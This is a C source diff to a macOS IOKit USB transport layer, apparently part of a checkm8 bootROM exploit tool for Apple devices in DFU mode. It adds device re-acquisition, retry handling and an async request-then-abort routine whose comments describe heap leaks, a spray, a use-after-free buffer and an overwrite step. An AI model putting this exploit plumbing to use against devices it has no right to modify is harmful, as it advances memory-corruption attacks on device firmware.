@@ -19,35 +19,63 @@ static int                      g_active;
 int iokit_usb_activate(void)
 {
     CFMutableDictionaryRef matching;
-    io_service_t serv;
+    io_service_t serv = 0;
     IOCFPlugInInterface **plugin;
     SInt32 score;
     IOReturn kr;
     int16_t vid = 0x05AC;
     int16_t pid = 0x1227;
     CFNumberRef cf_vid, cf_pid;
+    int match_try;
 
     if (g_active)
         return 0;
 
-    matching = IOServiceMatching(kIOUSBDeviceClassName);
-    if (!matching) {
-        log_error("iokit_usb: IOServiceMatching failed");
-        return -1;
+    /*
+     * Poll for the DFU IOService instead of a single-shot match.
+     *
+     * After a NotResponding/NoDevice event macOS tears the service
+     * down and the device re-enumerates; for a window of up to a few
+     * seconds it is simply absent from the IORegistry.  A single
+     * IOServiceGetMatchingService call inside that window fails hard
+     * ("DFU device not found") even though the device comes back
+     * moments later (on-device: service gone right after the
+     * spray-end NotResponding, back on the next enumeration).
+     */
+    {
+        for (match_try = 0; match_try < 24 && !serv; match_try++) {
+            matching = IOServiceMatching(kIOUSBDeviceClassName);
+            if (!matching) {
+                log_error("iokit_usb: IOServiceMatching failed");
+                return -1;
+            }
+            cf_vid = CFNumberCreate(kCFAllocatorDefault,
+                                    kCFNumberSInt16Type, &vid);
+            cf_pid = CFNumberCreate(kCFAllocatorDefault,
+                                    kCFNumberSInt16Type, &pid);
+            CFDictionarySetValue(matching, CFSTR(kUSBVendorID), cf_vid);
+            CFDictionarySetValue(matching, CFSTR(kUSBProductID), cf_pid);
+            CFRelease(cf_vid);
+            CFRelease(cf_pid);
+
+            serv = IOServiceGetMatchingService(0, matching);
+            if (!serv && match_try < 23) {
+                if (match_try == 0)
+                    log_info("iokit_usb: DFU service not up yet -- "
+                             "polling (up to 6 s)");
+                usleep(250000);
+            }
+        }
     }
-
-    cf_vid = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt16Type, &vid);
-    cf_pid = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt16Type, &pid);
-    CFDictionarySetValue(matching, CFSTR(kUSBVendorID), cf_vid);
-    CFDictionarySetValue(matching, CFSTR(kUSBProductID), cf_pid);
-    CFRelease(cf_vid);
-    CFRelease(cf_pid);
-
-    serv = IOServiceGetMatchingService(0, matching);
     if (!serv) {
-        log_error("iokit_usb: DFU device not found (05ac:1227)");
+        log_error("iokit_usb: DFU device not found (05ac:1227) "
+                  "after 6 s polling");
         return -1;
     }
+    if (match_try > 0)
+        log_info("iokit_usb: DFU service re-acquired after %d polls "
+                 "(%d ms) -- device re-enumerated",
+                 match_try + 1, match_try * 250);
 
     kr = IOCreatePlugInInterfaceForService(serv, kIOUSBDeviceUserClientTypeID,
                                            kIOCFPlugInInterfaceID,
@@ -107,6 +135,7 @@ void iokit_usb_deactivate(void)
     if (!g_active)
         return;
 
+    iokit_usb_iface_deactivate();
     if (g_async_source) {
         CFRunLoopRemoveSource(CFRunLoopGetCurrent(), g_async_source,
                               kCFRunLoopDefaultMode);
@@ -135,7 +164,17 @@ int iokit_usb_ctrl_transfer(uint8_t bmRequestType, uint8_t bRequest,
     IOUSBDevRequestTO req;
     IOReturn kr;
 
-    if (!g_active || !g_device)
+    /*
+     * Self-healing: if the handle went inactive (service died and a
+     * re-activation attempt failed earlier), try to re-open it before
+     * giving up.  activate() polls the IORegistry for up to ~6 s, so
+     * this also covers the re-enumeration window.
+     */
+    if (!g_active) {
+        if (iokit_usb_activate() != 0)
+            return LIBUSB_ERROR_NO_DEVICE;
+    }
+    if (!g_device)
         return LIBUSB_ERROR_NO_DEVICE;
 
     memset(&req, 0, sizeof(req));
@@ -158,7 +197,7 @@ int iokit_usb_ctrl_transfer(uint8_t bmRequestType, uint8_t bRequest,
         return LIBUSB_ERROR_TIMEOUT;
     }
     if (kr == kIOUSBPipeStalled) {
-        log_debug("iokit_usb: STALL (wLenDone=%u)", req.wLenDone);
+        log_info("iokit_usb: STALL (wLenDone=%u)", req.wLenDone);
         return LIBUSB_ERROR_PIPE;
     }
     if (kr == kIOReturnAborted) {
@@ -194,6 +233,58 @@ int iokit_usb_ctrl_transfer(uint8_t bmRequestType, uint8_t bRequest,
         kr = (*g_device)->DeviceRequestTO(g_device, &req);
         if (kr == kIOReturnSuccess)
             return (int)req.wLenDone;
+        /* Re-map the retry's IOReturn too: after a re-acquired service
+         * the STALL of the overwrite arrives as kIOUSBPipeStalled here,
+         * and falling through to LIBUSB_ERROR_OTHER turned a healthy
+         * run into a false negative (ret=-99). */
+        if (kr == (IOReturn)0xe0004051 || kr == kIOReturnTimeout)
+            return LIBUSB_ERROR_TIMEOUT;
+        if (kr == kIOUSBPipeStalled) {
+            /* wLenDone on the overwrite STALL is the E11 discriminator:
+             * 48 => DATA phase accepted into the UAF buffer, 0 => the
+             * request was rejected before any data landed. */
+            log_info("iokit_usb: STALL (wLenDone=%u, after re-activate)",
+                     req.wLenDone);
+            return LIBUSB_ERROR_PIPE;
+        }
+        if (kr == kIOReturnAborted)
+            return LIBUSB_ERROR_INTERRUPTED;
+    }
+
+    /*
+     * kIOReturnNotReady (0xe00002d8): seen right after the stage-3
+     * CLR_STATUS wedge, at the overwrite -- the user client survived
+     * but the pipe state is stale.  Same remedy as NoDevice: rebuild
+     * the handle and retry ONCE.
+     */
+    if (kr == (IOReturn)0xe00002d8) {
+        log_info("iokit_usb: kIOReturnNotReady -- re-activating handle "
+                 "and retrying");
+        iokit_usb_deactivate();
+        usleep(100000);
+        if (iokit_usb_activate() != 0)
+            return LIBUSB_ERROR_NO_DEVICE;
+
+        memset(&req, 0, sizeof(req));
+        req.bmRequestType = bmRequestType;
+        req.bRequest      = bRequest;
+        req.wValue        = wValue;
+        req.wIndex        = wIndex;
+        req.wLength       = wLength;
+        req.pData         = data;
+        req.completionTimeout = timeout_ms;
+        req.noDataTimeout     = timeout_ms;
+
+        kr = (*g_device)->DeviceRequestTO(g_device, &req);
+        if (kr == kIOReturnSuccess)
+            return (int)req.wLenDone;
+        if (kr == kIOUSBPipeStalled) {
+            log_info("iokit_usb: STALL (wLenDone=%u, after NotReady "
+                     "re-activate)", req.wLenDone);
+            return LIBUSB_ERROR_PIPE;
+        }
+        if (kr == (IOReturn)0xe0004051 || kr == kIOReturnTimeout)
+            return LIBUSB_ERROR_TIMEOUT;
     }
 
     log_warn("iokit_usb: DeviceRequestTO failed: IOReturn=0x%x wLenDone=%u",
@@ -204,11 +295,242 @@ int iokit_usb_ctrl_transfer(uint8_t bmRequestType, uint8_t bRequest,
 int iokit_usb_abort_pipe_zero(void)
 {
     IOReturn kr;
-    if (!g_active || !g_device)
+    if (!g_active) {
+        if (iokit_usb_activate() != 0)
+            return -1;
+    }
+    if (!g_device)
         return -1;
     kr = (*g_device)->USBDeviceAbortPipeZero(g_device);
     log_info("iokit_usb: AbortPipeZero ret=0x%x", kr);
+    if (kr == kIOReturnNoDevice) {
+        /* Same stale-service recovery as ctrl_transfer: re-acquire the
+         * (possibly re-enumerated) device and retry the abort once. */
+        log_info("iokit_usb: kIOReturnNoDevice -- re-acquiring device "
+                 "before retrying abort");
+        iokit_usb_deactivate();
+        if (iokit_usb_activate() != 0)
+            return -1;
+        kr = (*g_device)->USBDeviceAbortPipeZero(g_device);
+        log_info("iokit_usb: AbortPipeZero retry ret=0x%x", kr);
+    }
     return (kr == kIOReturnSuccess) ? 0 : -1;
+}
+
+/*
+ * gaster's leak/no_leak transport: submit the control request ASYNC,
+ * sleep abort_after_ms (1 ms / 0 ms) while the request is still pending
+ * on the device, then USBDeviceAbortPipeZero.  The abort snaps the
+ * device out of the hung request while it is in flight -- an abort
+ * after a synchronous timeout does not (by then the host has already
+ * abandoned the transfer, and the device-side request stays pending
+ * until the device's USB stack wedges and the device re-enumerates,
+ * destroying the whole checkm8 heap state).
+ *
+ * Completion callback runs on the async event source created in
+ * activate() (current thread's run loop), so we spin RunInMode until
+ * the completion fires.
+ */
+struct iokit_async_res {
+    volatile int completed;
+    IOReturn     ret;
+    uint32_t     done;
+};
+
+static void iokit_async_cb(void *refcon, IOReturn ret, void *arg)
+{
+    struct iokit_async_res *res = refcon;
+
+    if (res) {
+        res->ret = ret;
+        res->done = (uint32_t)(uintptr_t)arg;
+        res->completed = 1;
+    }
+    CFRunLoopStop(CFRunLoopGetCurrent());
+}
+
+int iokit_usb_ctrl_transfer_async_abort(uint8_t bmRequestType,
+                                        uint8_t bRequest,
+                                        uint16_t wValue, uint16_t wIndex,
+                                        void *data, uint16_t wLength,
+                                        uint32_t timeout_ms,
+                                        uint32_t abort_after_ms)
+{
+    IOUSBDevRequestTO req;
+    struct iokit_async_res res;
+    IOReturn kr;
+    int spins;
+
+    if (!g_active) {
+        if (iokit_usb_activate() != 0)
+            return LIBUSB_ERROR_NO_DEVICE;
+    }
+    if (!g_device)
+        return LIBUSB_ERROR_NO_DEVICE;
+
+    memset(&req, 0, sizeof(req));
+    req.bmRequestType = bmRequestType;
+    req.bRequest      = bRequest;
+    req.wValue        = wValue;
+    req.wIndex        = wIndex;
+    req.wLength       = wLength;
+    req.pData         = data;
+    req.completionTimeout = timeout_ms;
+    req.noDataTimeout     = timeout_ms;
+
+    memset(&res, 0, sizeof(res));
+    kr = (*g_device)->DeviceRequestAsyncTO(g_device, &req,
+                                           iokit_async_cb, &res);
+    if (kr != kIOReturnSuccess) {
+        log_warn("iokit_usb: DeviceRequestAsyncTO submit failed: 0x%x", kr);
+        return LIBUSB_ERROR_OTHER;
+    }
+
+    if (abort_after_ms)
+        usleep(abort_after_ms * 1000);
+    kr = (*g_device)->USBDeviceAbortPipeZero(g_device);
+    log_info("iokit_usb: async AbortPipeZero ret=0x%x (after %u ms)",
+             kr, abort_after_ms);
+
+    for (spins = 0; spins < 40 && !res.completed; spins++)
+        CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.25, false);
+
+    if (!res.completed) {
+        log_warn("iokit_usb: async request never completed");
+        return LIBUSB_ERROR_TIMEOUT;
+    }
+    if (res.ret == kIOReturnSuccess)
+        return (int)res.done;
+    if (res.ret == kIOUSBPipeStalled)
+        return LIBUSB_ERROR_PIPE;
+    /*
+     * gaster semantics for the leak/no_leak requests: only the byte
+     * count matters ("transfer_ret.sz == 0"), not the completion
+     * status.  Our own USBDeviceAbortPipeZero completes the request
+     * with kIOReturnAborted and wLenDone == 0 -- that IS the expected
+     * outcome (0 bytes transferred), so report 0, not a timeout.
+     */
+    return (int)res.done;
+}
+
+/*
+ * E9 transport: interface user client (pongoOS/checkra1n path).
+ *
+ * palera1n-c src/usb_iokit.c (derived from pongoOS, runs the checkm8
+ * flow on Apple Silicon) issues every EP0 control transfer through
+ * the IOUSBInterfaceInterface user client:
+ *
+ *     (*handle)->ControlRequest(handle, 0, &request);   // pipe 0
+ *
+ * with a plain IOUSBDevRequest (no completion/noData timeout fields),
+ * after opening the interface with USBInterfaceOpen.  This is a
+ * different kernel path from IOUSBDeviceInterface320::DeviceRequestTO
+ * (device user client, TO semantics) which is what gaster -- and we --
+ * use.  On Apple Silicon the device-user-client path wedges after an
+ * EP0 STALL; the interface path is what checkra1n actually ships.
+ */
+static IOUSBInterfaceInterface **g_iface;
+
+int iokit_usb_iface_activate(void)
+{
+    IOUSBFindInterfaceRequest req;
+    io_iterator_t iter = 0;
+    io_service_t intf;
+    IOReturn kr;
+    int opened = 0;
+
+    if (g_iface)
+        return 0;
+    if (!g_active || !g_device) {
+        if (iokit_usb_activate() != 0)
+            return -1;
+    }
+
+    memset(&req, 0, sizeof(req));
+    req.bInterfaceClass    = kIOUSBFindInterfaceDontCare;
+    req.bInterfaceSubClass = kIOUSBFindInterfaceDontCare;
+    req.bInterfaceProtocol = kIOUSBFindInterfaceDontCare;
+    req.bAlternateSetting  = kIOUSBFindInterfaceDontCare;
+
+    if ((*g_device)->CreateInterfaceIterator(g_device, &req, &iter)
+            != kIOReturnSuccess)
+        return -1;
+
+    while ((intf = IOIteratorNext(iter))) {
+        IOCFPlugInInterface **plugin = NULL;
+        SInt32 score = 0;
+        HRESULT hr;
+
+        kr = IOCreatePlugInInterfaceForService(intf,
+                kIOUSBInterfaceUserClientTypeID,
+                kIOCFPlugInInterfaceID, &plugin, &score);
+        IOObjectRelease(intf);
+        if (kr != kIOReturnSuccess || !plugin)
+            continue;
+        hr = (*plugin)->QueryInterface(plugin,
+                CFUUIDGetUUIDBytes(kIOUSBInterfaceInterfaceID),
+                (LPVOID *)&g_iface);
+        (*plugin)->Release(plugin);
+        if (hr != 0 || !g_iface)
+            continue;
+        kr = (*g_iface)->USBInterfaceOpen(g_iface);
+        if (kr == kIOReturnSuccess) {
+            opened = 1;
+            break;
+        }
+        log_warn("iokit_usb: USBInterfaceOpen failed: 0x%x", kr);
+        (*g_iface)->Release(g_iface);
+        g_iface = NULL;
+    }
+    if (iter)
+        IOObjectRelease(iter);
+
+    if (!opened) {
+        log_warn("iokit_usb: no usable DFU interface user client");
+        return -1;
+    }
+    log_info("iokit_usb: interface user client opened (E9 transport)");
+    return 0;
+}
+
+void iokit_usb_iface_deactivate(void)
+{
+    if (!g_iface)
+        return;
+    (*g_iface)->USBInterfaceClose(g_iface);
+    (*g_iface)->Release(g_iface);
+    g_iface = NULL;
+    log_info("iokit_usb: interface user client closed");
+}
+
+int iokit_usb_ctrl_transfer_iface(uint8_t bmRequestType, uint8_t bRequest,
+                                  uint16_t wValue, uint16_t wIndex,
+                                  void *data, uint16_t wLength)
+{
+    IOUSBDevRequest req;
+    IOReturn kr;
+
+    if (!g_iface) {
+        if (iokit_usb_iface_activate() != 0)
+            return LIBUSB_ERROR_NO_DEVICE;
+    }
+
+    memset(&req, 0, sizeof(req));
+    req.bmRequestType = bmRequestType;
+    req.bRequest      = bRequest;
+    req.wValue        = wValue;
+    req.wIndex        = wIndex;
+    req.wLength       = wLength;
+    req.pData         = data;
+
+    kr = (*g_iface)->ControlRequest(g_iface, 0, &req);
+    if (kr == kIOReturnSuccess)
+        return (int)req.wLenDone;
+    if (kr == kIOUSBPipeStalled)
+        return LIBUSB_ERROR_PIPE;
+    log_warn("iokit_usb: ControlRequest failed: 0x%x (wLenDone=%u)",
+             kr, req.wLenDone);
+    return LIBUSB_ERROR_OTHER;
 }
 
 int iokit_usb_read_serial(uint8_t iserial_idx, char *out, size_t outsz)
